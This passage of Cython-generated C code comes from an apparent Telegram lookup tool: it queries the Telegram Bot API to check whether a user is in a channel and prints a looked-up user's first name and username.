  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (__pyx_t_7) {

    
    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_json); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 159, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_6);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_6, function);
      }
    }
    __pyx_t_5 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 159, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_v_data = __pyx_t_5;
    __pyx_t_5 = 0;

    
    __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_v_data, __pyx_n_u_ok); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 160, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_7 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_7 < 0)) __PYX_ERR(0, 160, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (__pyx_t_7) {

      
      __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_v_data, __pyx_n_u_result); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 161, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_v_user_info = __pyx_t_5;
      __pyx_t_5 = 0;

      
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_user_info, __pyx_n_s_get); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 162, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_tuple__9, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 162, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_v_first_name = __pyx_t_6;
      __pyx_t_6 = 0;

      
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_user_info, __pyx_n_s_get); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 163, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__10, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 163, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_v_username = __pyx_t_5;
      __pyx_t_5 = 0;

      
      __pyx_t_5 = PyTuple_New(6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 166, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_2 = 0;
      __pyx_t_3 = 127;
      __Pyx_INCREF(__pyx_kp_u__5);
      __pyx_t_2 += 1;
      __Pyx_GIVEREF(__pyx_kp_u__5);
      PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_kp_u__5);
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_G6); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 166, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 166, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_3;
      __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
      __Pyx_GIVEREF(__pyx_t_4);
      PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_t_4);
      __pyx_t_4 = 0;
      __Pyx_INCREF(__pyx_kp_u_s);
      __pyx_t_3 = (1114111 > __pyx_t_3) ? 1114111 : __pyx_t_3;
      __pyx_t_2 += 13;
      __Pyx_GIVEREF(__pyx_kp_u_s);
      PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_kp_u_s);
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_B6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 166, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 166, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_3;
      __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
      __Pyx_GIVEREF(__pyx_t_6);
      PyTuple_SET_ITEM(__pyx_t_5, 3, __pyx_t_6);
      __pyx_t_6 = 0;
      __Pyx_INCREF(__pyx_kp_u_Y_N);
      __pyx_t_3 = (65535 > __pyx_t_3) ? 65535 : __pyx_t_3;
      __pyx_t_2 += 17;
      __Pyx_GIVEREF(__pyx_kp_u_Y_N);
      PyTuple_SET_ITEM(__pyx_t_5, 4, __pyx_kp_u_Y_N);
      __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_v_first_name, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 166, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_3;
      __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
      __Pyx_GIVEREF(__pyx_t_6);
      PyTuple_SET_ITEM(__pyx_t_5, 5, __pyx_t_6);
      __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyUnicode_Join(__pyx_t_5, 6, __pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 166, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 166, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

      
      __pyx_t_7 = __Pyx_PyObject_IsTrue(__pyx_v_username); if (unlikely(__pyx_t_7 < 0)) __PYX_ERR(0, 167, __pyx_L1_error)
      if (__pyx_t_7) {

        
        __pyx_t_5 = PyTuple_New(3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 168, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_2 = 0;
        __pyx_t_3 = 127;
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_B6); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 168, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 168, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_3;
        __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_4);
        __pyx_t_4 = 0;
        __Pyx_INCREF(__pyx_kp_u_Y_Us);
        __pyx_t_3 = (65535 > __pyx_t_3) ? 65535 : __pyx_t_3;
        __pyx_t_2 += 21;
        __Pyx_GIVEREF(__pyx_kp_u_Y_Us);
        PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_kp_u_Y_Us);
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_username, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 168, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_3;
        __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_t_4);
        __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_5, 3, __pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 168, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 168, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

        
        goto __pyx_L5;
      }

      
      /*else*/ {
        __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__11, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 170, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      }
      __pyx_L5:;

      
      goto __pyx_L4;
    }

    
    /*else*/ {
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__12, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 172, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    }
    __pyx_L4:;

    
    goto __pyx_L3;
  }

  
  /*else*/ {
    __pyx_t_5 = PyTuple_New(3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 174, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_2 = 0;
    __pyx_t_3 = 127;
    __Pyx_INCREF(__pyx_kp_u__13);
    __pyx_t_2 += 1;
    __Pyx_GIVEREF(__pyx_kp_u__13);
    PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_kp_u__13);
    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_red6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 174, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 174, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_3;
    __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
    __Pyx_GIVEREF(__pyx_t_6);
    PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_t_6);
    __pyx_t_6 = 0;
    __Pyx_INCREF(__pyx_kp_u_E_Y_Us_Ws_W);
    __pyx_t_3 = (1114111 > __pyx_t_3) ? 1114111 : __pyx_t_3;
    __pyx_t_2 += 36;
    __Pyx_GIVEREF(__pyx_kp_u_E_Y_Us_Ws_W);
    PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_kp_u_E_Y_Us_Ws_W);
    __pyx_t_6 = __Pyx_PyUnicode_Join(__pyx_t_5, 3, __pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 174, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 174, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  }
  __pyx_L3:;

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_AddTraceback("source.get_user_info", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_url);
  __Pyx_XDECREF(__pyx_v_params);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_user_info);
  __Pyx_XDECREF(__pyx_v_first_name);
  __Pyx_XDECREF(__pyx_v_username);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_7is_user_in_channel(PyObject *__pyx_self, PyObject *__pyx_v_ID); /*proto*/
static PyMethodDef __pyx_mdef_6source_7is_user_in_channel = {"is_user_in_channel", (PyCFunction)__pyx_pw_6source_7is_user_in_channel, METH_O, 0};
static PyObject *__pyx_pw_6source_7is_user_in_channel(PyObject *__pyx_self, PyObject *__pyx_v_ID) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("is_user_in_channel (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_6is_user_in_channel(__pyx_self, ((PyObject *)__pyx_v_ID));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_6is_user_in_channel(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_ID) {
  PyObject *__pyx_v_url = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  Py_ssize_t __pyx_t_2;
  Py_UCS4 __pyx_t_3;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_t_7;
  int __pyx_t_8;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("is_user_in_channel", 0);

  
  __pyx_t_1 = PyTuple_New(6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 190, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = 0;
  __pyx_t_3 = 127;
  __Pyx_INCREF(__pyx_kp_u_https_api_telegram_org_bot);
  __pyx_t_2 += 28;
  __Pyx_GIVEREF(__pyx_kp_u_https_api_telegram_org_bot);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u_https_api_telegram_org_bot);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_BOT_TOKEN); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 190, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 190, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_3;
  __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
  __Pyx_GIVEREF(__pyx_t_5);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_5);
  __pyx_t_5 = 0;
  __Pyx_INCREF(__pyx_kp_u_getChatMember_chat_id);
  __pyx_t_2 += 23;
  __Pyx_GIVEREF(__pyx_kp_u_getChatMember_chat_id);
  PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u_getChatMember_chat_id);
  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_CHANNEL_ID); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 190, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 190, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_3;
  __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_1, 3, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u_user_id_2);
  __pyx_t_2 += 9;
  __Pyx_GIVEREF(__pyx_kp_u_user_id_2);
  PyTuple_SET_ITEM(__pyx_t_1, 4, __pyx_kp_u_user_id_2);
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_ID, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 190, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_3;
  __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_1, 5, __pyx_t_4);
  __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_1, 6, __pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 190, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_url = ((PyObject*)__pyx_t_4);
  __pyx_t_4 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_requests); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 191, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_get); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 191, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_6, function);
    }
  }
  __pyx_t_1 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_5, __pyx_v_url) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_v_url);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 191, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_json); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 191, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
    __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_6);
    if (likely(__pyx_t_1)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
      __Pyx_INCREF(__pyx_t_1);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_6, function);
    }
  }
  __pyx_t_4 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 191, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_v_response = __pyx_t_4;
  __pyx_t_4 = 0;

  
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_get); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 192, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_1 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
    __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_6);
    if (likely(__pyx_t_1)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
      __Pyx_INCREF(__pyx_t_1);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_6, function);
    }
  }
  __pyx_t_4 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_1, __pyx_n_u_ok) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_n_u_ok);
  __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 192, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_7 = __Pyx_PyObject_IsTrue(__pyx_t_4); if (unlikely(__pyx_t_7 < 0)) __PYX_ERR(0, 192, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (__pyx_t_7) {

    
    __Pyx_XDECREF(__pyx_r);
    __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_response, __pyx_n_u_result); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 193, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_6 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_u_status); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 193, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_8 = (__Pyx_PyUnicode_Equals(__pyx_t_6, __pyx_n_u_member, Py_EQ)); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 193, __pyx_L1_error)
    if (!__pyx_t_8) {
    } else {
      __pyx_t_7 = __pyx_t_8;
      goto __pyx_L4_bool_binop_done;
    }
    __pyx_t_8 = (__Pyx_PyUnicode_Equals(__pyx_t_6, __pyx_n_u_administrator, Py_EQ)); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 193, __pyx_L1_error)
    if (!__pyx_t_8) {
    } else {
      __pyx_t_7 = __pyx_t_8;
      goto __pyx_L4_bool_binop_done;
    }
    __pyx_t_8 = (__Pyx_PyUnicode_Equals(__pyx_t_6, __pyx_n_u_creator, Py_EQ)); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 193, __pyx_L1_error)
    __pyx_t_7 = __pyx_t_8;
    __pyx_L4_bool_binop_done:;
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_6 = __Pyx_PyBool_FromLong(__pyx_t_7); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 193, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_r = __pyx_t_6;
    __pyx_t_6 = 0;
    goto __pyx_L0;

    
  }

  
  __Pyx_XDECREF(__pyx_r);
  __Pyx_INCREF(Py_False);
  __pyx_r = Py_False;
  goto __pyx_L0;

  

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_AddTraceback("source.is_user_in_channel", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_url);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_9main(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_9main = {"main", (PyCFunction)__pyx_pw_6source_9main, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_9main(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("main (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_8main(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_8main(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_e = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  int __pyx_t_8;
  int __pyx_t_9;
  int __pyx_t_10;
  PyObject *__pyx_t_11 = NULL;
  int __pyx_t_12;
  char const *__pyx_t_13;
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  PyObject *__pyx_t_19 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("main", 0);

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      
      __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__14, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 201, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_ID, __pyx_t_4) < 0) __PYX_ERR(0, 201, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_is_user_in_channel); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 203, __pyx_L3_error)
